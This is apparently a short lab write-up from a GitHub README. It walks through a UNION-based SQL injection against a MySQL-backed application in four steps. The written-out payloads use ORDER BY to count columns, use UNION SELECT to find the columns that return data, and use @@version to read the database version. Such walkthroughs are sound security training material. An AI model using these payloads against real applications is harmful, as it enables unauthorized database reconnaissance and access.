# SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft

> # (1) To findout existing column: 'ORDER BY 1--. But got internal server error. because in mysql database the comment method is comment# instead of comment--
![image](https://user-images.githubusercontent.com/59218362/208425263-71407b5f-78ac-4af4-a82d-2ec59cdf2108.png)

> # (2) After giving the query for mysql database: 'ORDER BY 1#. Here, we got the 2 columns are available.
![image](https://user-images.githubusercontent.com/59218362/208426681-15809a80-2558-44c8-a910-aca4e9abf3e8.png)
![image](https://user-images.githubusercontent.com/59218362/208426554-94ad84db-bd2e-451e-baba-e1372c79e782.png)

> # (3) To findout which column are data retrieving: 'UNION SELECT 'Data','Data'#. Both two columns are retrieving data
![image](https://user-images.githubusercontent.com/59218362/208427762-f3434c3d-dcc8-4e87-89bd-14d849c2e236.png)

> # (4) To know the version of mysql database: 'UNION SELECT @@version, NULL#
![image](https://user-images.githubusercontent.com/59218362/208429320-ff2fbadf-fea8-4727-acfc-fb7deb462fe7.png)
